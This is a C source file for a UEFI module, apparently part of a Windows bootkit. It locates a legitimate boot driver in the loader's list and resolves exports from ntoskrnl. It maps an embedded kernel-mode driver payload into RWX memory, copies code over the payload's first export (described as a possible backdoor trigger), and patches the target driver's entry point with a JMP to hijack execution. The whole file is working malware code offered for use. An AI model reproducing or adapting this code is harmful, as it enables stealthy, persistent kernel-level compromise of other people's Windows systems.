// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------



/**
	@file

	Utils Kernel Mode Driver Mapper
**/



// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------
// START -> LIBRARIES -------------------------------------------------------------------------------------------------------------------------


// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Uefi.h
// Root include file for Mde Package UEFI, UEFI_APPLICATION type modules. This is the include file for any module of type UEFI and UEFI_APPLICATION. Uefi modules only use types defined via this include file and can be ported easily to any environment.
#include <Uefi.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiBootServicesTableLib.h
// Provides a service to retrieve a pointer to the EFI Boot Services Table. Only available to DXE and UEFI module types.
#include <Library/UefiBootServicesTableLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/UefiLib.h
// Provides library functions for common UEFI operations. Only available to DXE and UEFI module types. The UEFI Library provides functions and macros that simplify the development of UEFI Drivers and UEFI Applications. These functions and macros help manage EFI events, build simple locks utilizing EFI Task Priority Levels (TPLs), install EFI Driver Model related protocols, manage Unicode string tables for UEFI Drivers, and print messages on the console output and standard error devices.
#include <Library/UefiLib.h>

// https://github.com/tianocore/edk2/blob/master/MdePkg/Include/Library/BaseMemoryLib.h
// Provides copy memory, fill memory, zero memory, and GUID functions. The Base Memory Library provides optimized implementations for common memory-based operations. These functions should be used in place of coding your own loops to do equivalent common functions. This allows optimized library implementations to help increase performance.
#include <Library/BaseMemoryLib.h>



// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------
// START -> LOCAL -----------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module0_PreBoot0_Configuration/Functions/Functions00Configuration.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils01Strings.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils03Memory.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils04Headers.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils09Hooks.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Utils/Utils11KernelModeDriverMapper.h>
#include <Modules/Module1_BootWindows0_Hookings/Functions/Functions03PatchHookWindowsKernel.h>



// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------
// START -> STRUCTURES ------------------------------------------------------------------------------------------------------------------------



#include <Modules/Module1_BootWindows0_Hookings/Structures/Structures00ArcSystemFirmware.h>
#include <Modules/Module1_BootWindows0_Hookings/Structures/Structures01PortableExecutable.h>
#include <Modules/Module1_BootWindows0_Hookings/Payloads/Payloads00KernelModeDriver.h>



// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------
// START -> GLOBAL VARIABLES ------------------------------------------------------------------------------------------------------------------



// Global variable that tracks the current RWX memory buffer and status of the mapped kernel-mode driver payload
STRUCTURE_BOOTWINDOWSHOOKINGS_STRUCTURESKERNELMODEDRIVERMAPPER_MAPPED_KERNEL_MODE_DRIVER_STATE Global_BootWindowsHookings_UtilsKernelModeDriverMapper_MappedKernelModeDriverState = { 0 };



// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------
// START -> FUNCTIONS -------------------------------------------------------------------------------------------------------------------------



/**
	@brief          Get a loaded module entry from the boot loader's LoadOrderList based on its name.
	@details        Iterates through the bootloader's LoadOrderList to find a module whose BaseDllName matches the specified name (case-insensitive). This is useful for locating known drivers that can be hijacked during the early boot stage.


	@param[in]      LoadOrderListHead       Pointer to the head of the LoadOrderList.
	@param[in]      ModuleName              Case-insensitive name of the module to locate (e.g., L"acpiex.sys").


	@retval         !NULL                   Pointer to the driver's KLDR_DATA_TABLE_ENTRY.
	@retval         NULL                    Module not found in the load list.
**/
PKLDR_DATA_TABLE_ENTRY
BootWindowsHookings_UtilsMapper_FindLoadedBootDriverByName(
	IN              LIST_ENTRY*             LoadOrderListHead,
	IN              CHAR16*                 ModuleName
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Hello


	// ---------------------------------------------------------------------------------------------------------------------
	// Bad parameters
	if (ModuleName == NULL || LoadOrderListHead == NULL)
	{
		return NULL;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Iterate through LoadOrderList to find desired module
	for (LIST_ENTRY* ListEntry = LoadOrderListHead->ForwardLink; ListEntry != LoadOrderListHead; ListEntry = ListEntry->ForwardLink)
	{
		// -----------------------------------------------------------------------------------------------------------------
		// Entry
		CONST PBLDR_DATA_TABLE_ENTRY Entry = (PBLDR_DATA_TABLE_ENTRY)BASE_CR(ListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);


		// -----------------------------------------------------------------------------------------------------------------
		// Perform a case-insensitive comparison of module names
		if (Entry != NULL && BootWindowsHookings_UtilsStrings_StrniCmp(Entry->KldrEntry.BaseDllName.Buffer, ModuleName, (Entry->KldrEntry.BaseDllName.Length / sizeof(CHAR16))) == 0)
		{

			// -------------------------------------------------------------------------------------------------------------
			// Match found
			return &Entry->KldrEntry;
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Match not found


	// ---------------------------------------------------------------------------------------------------------------------
	// Bye


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return NULL;
}



/**
	@brief          Resolves an exported function from a PE image by name.
	@details        This function parses the export directory of a PE image loaded in memory, searches for a function by its ASCII name, and returns the virtual address of the export within the image. Useful for resolving imports manually at runtime, e.g., resolving functions from ntoskrnl.exe or other modules during preboot or boot phases.


	@param[in]      base                    Pointer to the base of the PE image in memory.
	@param[in]      export                  ASCII string name of the function to resolve.


	@retval         != 0                    Virtual address of the resolved export (within the same image).
	@retval         0                       Function not found or invalid PE structure.
**/
UINT64
BootWindowsHookings_UtilsMapper_GetExport(
	IN              UINT8                   *base,
	IN              CHAR8                   *export)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Cast the image base to a DOS header to access e_lfanew (PE header offset)
	EFI_IMAGE_DOS_HEADER *dosHeaders = (EFI_IMAGE_DOS_HEADER *)base;

	// Check DOS header magic (should be 'MZ')
	if (dosHeaders->e_magic != EFI_IMAGE_DOS_SIGNATURE)
	{
		// Invalid DOS header
		return 0;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get pointer to PE header using e_lfanew offset from DOS header
	EFI_IMAGE_NT_HEADERS64 *ntHeaders = (EFI_IMAGE_NT_HEADERS64 *)(base + dosHeaders->e_lfanew);


	// ---------------------------------------------------------------------------------------------------------------------
	// Get the RVA of the export directory from the data directory in the optional header
	UINT32 exportsRva = ntHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	// Failed
	if (!exportsRva)
	{
		return 0;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Get pointer to the export directory structure using the RVA
	EFI_IMAGE_EXPORT_DIRECTORY *exports = (EFI_IMAGE_EXPORT_DIRECTORY *)(base + exportsRva);


	// ---------------------------------------------------------------------------------------------------------------------
	// Get pointer to the list of exported function name RVAs
	UINT32 *nameRva = (UINT32 *)(base + exports->AddressOfNames);


	// ---------------------------------------------------------------------------------------------------------------------
	// Iterate through all exported names
	for (UINT32 i = 0; i < exports->NumberOfNames; ++i)
	{
		// Resolve the current function name from its RVA
		CHAR8 *func = (CHAR8 *)(base + nameRva[i]);

		// Compare current name with requested export name
		// Compares two Null-terminated ASCII strings, and returns the difference between the first mismatched ASCII characters.
		// https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/String.c#L708
		if (AsciiStrCmp(func, export) == 0)
		{
			// If match is found, get the RVA of the functions and ordinals
			UINT32 *funcRva = (UINT32 *)(base + exports->AddressOfFunctions);
			UINT16 *ordinalRva = (UINT16 *)(base + exports->AddressOfNameOrdinals);

			// Resolve and return the VA of the function using the ordinal index
			return (UINT64)base + funcRva[ordinalRva[i]];
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// No match found in the export table


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return 0;
}



/**
	@brief          Maps a raw PE driver payload into a preallocated RWX memory buffer.
	@details        This function copies a PE image into a bootkit-allocated RWX region in memory. It fixes up section data, resolves imports against ntoskrnl.exe, and applies base relocations. Optionally, it can overwrite an exported function inside the payload with a user-supplied routine, allowing IPC or syscall exposure post-boot.


	@param[in]      NtoskrnlBase            Base address of the loaded ntoskrnl.exe image.
	@param[out]     EntryPoint              Receives the virtual address of the mapped payload's entry point.
	@param[in]      OptionalFunction        Optional function whose code will replace the first export in the payload (can be NULL).


	@retval         EFI_SUCCESS             The payload was successfully mapped and relocated.
	@retval         EFI_NOT_FOUND           Failed to resolve one or more imports.
**/
EFI_STATUS
BootWindowsHookings_UtilsMapper_MapPayloadToRWXMemory(
	IN              VOID                    *NtoskrnlBase,
	OUT             VOID                    **EntryPoint,
	IN              VOID                    *TargetFunction
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Address where the mapper will live (pre-allocated RWX buffer)
	UINT8 *MapperBase = Global_BootWindowsHookings_UtilsKernelModeDriverMapper_MappedKernelModeDriverState.AllocatedBuffer;


	// ---------------------------------------------------------------------------------------------------------------------
	// Pointer to the raw PE image embedded in the bootkit
	UINT8 *MapperRaw = (UINT8 *)Global_BootWindowsHookings_PayloadsKernelModeDriver_KernelModeDriver;


	// ---------------------------------------------------------------------------------------------------------------------
	// Parse PE headers
	EFI_IMAGE_NT_HEADERS64 *NtHeaders = (EFI_IMAGE_NT_HEADERS64 *)(MapperRaw + ((EFI_IMAGE_DOS_HEADER *)MapperRaw)->e_lfanew);


	// ---------------------------------------------------------------------------------------------------------------------
	// Clear destination memory
	BootWindowsHookings_UtilsMemory_ZeroMemory(MapperBase, NtHeaders->OptionalHeader.SizeOfImage);


	// ---------------------------------------------------------------------------------------------------------------------
	// Copy PE headers to destination
	BootWindowsHookings_UtilsMemory_CopyMemory(MapperBase, MapperRaw, NtHeaders->OptionalHeader.SizeOfHeaders);


	// ---------------------------------------------------------------------------------------------------------------------
	// Copy all section bodies (.text, .rdata, etc.)

	// Get pointer to first section header
	EFI_IMAGE_SECTION_HEADER *Sections = (EFI_IMAGE_SECTION_HEADER *)((UINT8 *)&NtHeaders->OptionalHeader + NtHeaders->FileHeader.SizeOfOptionalHeader);

	// Iterate through each section
	for (UINT16 i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++)
	{
		// Skip sections with no raw data
		if (Sections[i].SizeOfRawData)
		{
			// Copy section raw data to its in-memory RVA
			BootWindowsHookings_UtilsMemory_CopyMemory(MapperBase + Sections[i].VirtualAddress, MapperRaw + Sections[i].PointerToRawData, Sections[i].SizeOfRawData);
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Resolve imports against ntoskrnl.exe

	// Get RVA of the import table
	UINT32 ImportsRVA = NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

	// If the PE has imports
	if (ImportsRVA)
	{

		// Get pointer to first import descriptor
		IMAGE_IMPORT_DESCRIPTOR *ImportDesc = (IMAGE_IMPORT_DESCRIPTOR *)(MapperBase + ImportsRVA);

		// Iterate through each DLL imported
		while (ImportDesc->FirstThunk)
		{

			// Import Address Table (IAT)
			IMAGE_THUNK_DATA64 *Thunk = (IMAGE_THUNK_DATA64 *)(MapperBase + ImportDesc->FirstThunk);

			// OriginalFirstThunk points to function names
			IMAGE_THUNK_DATA64 *OrigThunk = (IMAGE_THUNK_DATA64 *)(MapperBase + ImportDesc->u.OriginalFirstThunk);

			// Iterate through imported functions
			while (Thunk->u1.AddressOfData)
			{

				// Get the function name to resolve
				IMAGE_IMPORT_BY_NAME *Import = (IMAGE_IMPORT_BY_NAME *)(MapperBase + OrigThunk->u1.AddressOfData);

				// Look up export inside ntoskrnl
				UINT64 Address = BootWindowsHookings_UtilsMapper_GetExport(NtoskrnlBase, (CHAR8 *)Import->Name);

				// Abort if any symbol is missing
				if (!Address)
				{
					//gBS->Stall(20*1000000);
					return EFI_NOT_FOUND;
				}

				// Overwrite IAT entry with resolved kernel virtual address

				// Write resolved kernel address into the IAT
				Thunk->u1.Function = Address;

				// Move to next thunk
				Thunk++;

				// Move to next original thunk
				OrigThunk++;
			}

			// Move to next DLL descriptor
			ImportDesc++;
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Apply base relocations so the image is self-contained at MapperBase

	// Get pointer to base relocation directory entry
	EFI_IMAGE_DATA_DIRECTORY *RelocDir = &NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC];

	// If there are relocations
	if (RelocDir->VirtualAddress)
	{

		// Get pointer to first relocation block
		PEFI_IMAGE_BASE_RELOCATION Reloc = (PEFI_IMAGE_BASE_RELOCATION)(MapperBase + RelocDir->VirtualAddress);

		// Track total size of processed relocation data
		UINT32 RelocSize = 0;

		// While there are relocations left to process
		while (RelocSize < RelocDir->Size)
		{

			// Number of relocation entries in the block
			UINT32 Count = (Reloc->SizeOfBlock - sizeof(EFI_IMAGE_BASE_RELOCATION)) / sizeof(UINT16);

			// Pointer to relocation entries
			UINT16 *RelocData = (UINT16 *)(Reloc + 1);

			// Base address where relocation applies
			UINT8 *Base = MapperBase + Reloc->VirtualAddress;

			// Iterate through entries in this block
			for (UINT32 i = 0; i < Count; i++)
			{

				// Get relocation entry
				UINT16 Entry = RelocData[i];

				// Extract relocation type (high 4 bits)
				UINT16 Type = Entry >> 12;

				// Extract offset within the block
				UINT16 Offset = Entry & 0xFFF;

				// Only process 64-bit address relocations
				if (Type == EFI_IMAGE_REL_BASED_DIR64)
				{

					// Get address to patch
					UINT64 *Patch = (UINT64 *)(Base + Offset);

					// Adjust address to new base
					*Patch = (*Patch - NtHeaders->OptionalHeader.ImageBase) + (UINT64)MapperBase;
				}
			}

			// Advance to next relocation block
			RelocSize += Reloc->SizeOfBlock;

			// Update pointer to next block
			Reloc = (PEFI_IMAGE_BASE_RELOCATION)((UINT8 *)Reloc + Reloc->SizeOfBlock);
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Inject external function code into the first exported function of the mapped image. This is useful for exposing a runtime-accessible entry point (e.g., IPC handler or backdoor trigger).

	// Get the RVA of the export directory from the PE data directory
	UINT32 ExportsRVA = NtHeaders->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	// If there are exports in the PE
	if (ExportsRVA)
	{

		// Locate the export directory structure in memory
		EFI_IMAGE_EXPORT_DIRECTORY *Exports = (EFI_IMAGE_EXPORT_DIRECTORY *)(MapperBase + ExportsRVA);

		// At least one export
		if (Exports->NumberOfNames > 0)
		{

			// Pointer to the array of exported function RVAs
			UINT32 *FuncRVAs = (UINT32 *)(MapperBase + Exports->AddressOfFunctions);

			// Pointer to the array of name ordinals (maps names to function indexes)
			UINT16 *Ordinals = (UINT16 *)(MapperBase + Exports->AddressOfNameOrdinals);

			// Overwrite the first exported function with our custom target code (This allows runtime code to call into our payload via export symbol)
			// Replace first exported function's code with TargetFunction
			BootWindowsHookings_UtilsMemory_CopyMemory(MapperBase + FuncRVAs[Ordinals[0]], TargetFunction, MACRO_BOOTWINDOWSHOOKINGS_UTILSMAPPER_MAPPER_DATA_SIZE);
		}
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Return the mapped entry point to caller
	*EntryPoint = MapperBase + NtHeaders->OptionalHeader.AddressOfEntryPoint;


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



/**
	@brief          Redirects a boot-loaded driver's entry point to a memory-mapped payload.
	@details        This function hijacks the execution flow of a legitimate driver by overwriting its entry point with a JMP rel32 instruction pointing to the mapper payload. The payload must already be mapped in RWX memory.


	@param[in]      Ntoskrnl                Pointer to the kernel's KLDR_DATA_TABLE_ENTRY (used for resolving imports).
	@param[in]      TargetDriver            Pointer to the target driver's KLDR_DATA_TABLE_ENTRY to patch.


	@retval         EFI_SUCCESS             Driver entry point successfully patched.
	@retval         EFI_NOT_READY           The mapper buffer was not allocated or initialized.
	@retval         Other EFI_ERROR         Error occurred while mapping the payload.
**/
EFI_STATUS
BootWindowsHookings_UtilsMapper_PatchDriverEntryWithMapperPayload(
	IN              KLDR_DATA_TABLE_ENTRY   *Ntoskrnl,
	IN              KLDR_DATA_TABLE_ENTRY   *TargetModule
)
{
	// ---------------------------------------------------------------------------------------------------------------------
	// Check if the memory buffer used to store the mapper payload was successfully allocated.
	if (!Global_BootWindowsHookings_UtilsKernelModeDriverMapper_MappedKernelModeDriverState.AllocatedBuffer)
	{
		//gBS->Stall(20*1000000);
		return EFI_NOT_READY;
	}

	// ---------------------------------------------------------------------------------------------------------------------
	// EntryPoint will hold the address where the payload will be mapped in memory.
	VOID *EntryPoint = NULL;


	// ---------------------------------------------------------------------------------------------------------------------
	// Map the mapper payload to memory, resolving addresses relative to ntoskrnl.
	EFI_STATUS Status = BootWindowsHookings_UtilsMapper_MapPayloadToRWXMemory(Ntoskrnl->DllBase, &EntryPoint, TargetModule->EntryPoint);

	// If the mapping failed (e.g., not enough space or corruption), return the error.
	if (EFI_ERROR(Status))
	{
		//gBS->Stall(20*1000000);
		return Status;
	}


	// ---------------------------------------------------------------------------------------------------------------------
	// Calculate the relative offset for a JMP rel32 from the driver's original entry point to the newly mapped payload entry point.
	UINT8 *DriverEntry = (UINT8 *)TargetModule->EntryPoint;

	// 5 bytes (size of JMP rel32)
	INT32 RelOffset = (INT32)((UINT8 *)EntryPoint - DriverEntry - 5);


	// ---------------------------------------------------------------------------------------------------------------------
	// Prepare the JMP instruction (E9 followed by a 4-byte relative offset).
	UINT8 JmpRel32[5] = { 0xE9, 0, 0, 0, 0 };


	// ---------------------------------------------------------------------------------------------------------------------
	// Fill in the 4-byte offset
	CopyMem(&JmpRel32[1], &RelOffset, sizeof(INT32));


	// ---------------------------------------------------------------------------------------------------------------------
	// Overwrite the driver's original entry point with the JMP instruction to hijack execution.
	BootWindowsHookings_UtilsMemory_CopyMemory(DriverEntry, JmpRel32, sizeof(JmpRel32));


	// ---------------------------------------------------------------------------------------------------------------------
	// Return
	return EFI_SUCCESS;
}



// --------------------------------------------------------------------------------------------------------------------------------------------
// --------------------------------------------------------------------------------------------------------------------------------------------
